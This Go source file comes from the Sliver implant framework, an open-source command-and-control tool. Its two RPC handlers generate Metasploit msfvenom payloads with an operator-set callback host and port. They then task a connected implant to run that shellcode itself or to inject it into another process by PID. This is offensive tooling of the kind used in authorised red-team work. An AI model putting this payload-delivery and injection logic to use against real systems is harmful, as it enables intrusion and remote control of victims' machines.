package rpc

/*
	Sliver Implant Framework
	Copyright (C) 2019  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (
	"time"

	clientpb "github.com/bishopfox/sliver/protobuf/client"
	sliverpb "github.com/bishopfox/sliver/protobuf/sliver"
	"github.com/bishopfox/sliver/server/core"
	"github.com/bishopfox/sliver/server/msf"

	"github.com/golang/protobuf/proto"
)

func rpcMsf(req []byte, timeout time.Duration, resp RPCResponse) {
	msfReq := &clientpb.MSFReq{}
	err := proto.Unmarshal(req, msfReq)
	if err != nil {
		resp([]byte{}, err)
		return
	}

	sliver := core.Hive.Sliver(msfReq.SliverID)
	if sliver == nil {
		resp([]byte{}, err)
		return
	}

	config := msf.VenomConfig{
		Os:         sliver.Os,
		Arch:       msf.Arch(sliver.Arch),
		Payload:    msfReq.Payload,
		LHost:      msfReq.LHost,
		LPort:      uint16(msfReq.LPort),
		Encoder:    msfReq.Encoder,
		Iterations: int(msfReq.Iterations),
	}
	rawPayload, err := msf.VenomPayload(config)
	if err != nil {
		rpcLog.Warnf("Error while generating msf payload: %v\n", err)
		resp([]byte{}, err)
		return
	}
	data, _ := proto.Marshal(&sliverpb.Task{
		Encoder: "raw",
		Data:    rawPayload,
	})
	data, err = sliver.Request(sliverpb.MsgTask, timeout, data)
	resp(data, err)
}

func rpcMsfInject(req []byte, timeout time.Duration, resp RPCResponse) {
	msfReq := &clientpb.MSFInjectReq{}
	err := proto.Unmarshal(req, msfReq)
	if err != nil {
		resp([]byte{}, err)
		return
	}

	sliver := core.Hive.Sliver(msfReq.SliverID)
	if sliver == nil {
		resp([]byte{}, err)
		return
	}

	config := msf.VenomConfig{
		Os:         sliver.Os,
		Arch:       msf.Arch(sliver.Arch),
		Payload:    msfReq.Payload,
		LHost:      msfReq.LHost,
		LPort:      uint16(msfReq.LPort),
		Encoder:    msfReq.Encoder,
		Iterations: int(msfReq.Iterations),
	}
	rawPayload, err := msf.VenomPayload(config)
	if err != nil {
		rpcLog.Errorf("Error while generating msf payload: %v\n", err)
		resp([]byte{}, err)
		return
	}
	data, _ := proto.Marshal(&sliverpb.RemoteTask{
		Pid:     msfReq.PID,
		Encoder: "raw",
		Data:    rawPayload,
	})
	data, err = sliver.Request(sliverpb.MsgRemoteTask, timeout, data)
	resp(data, err)
}
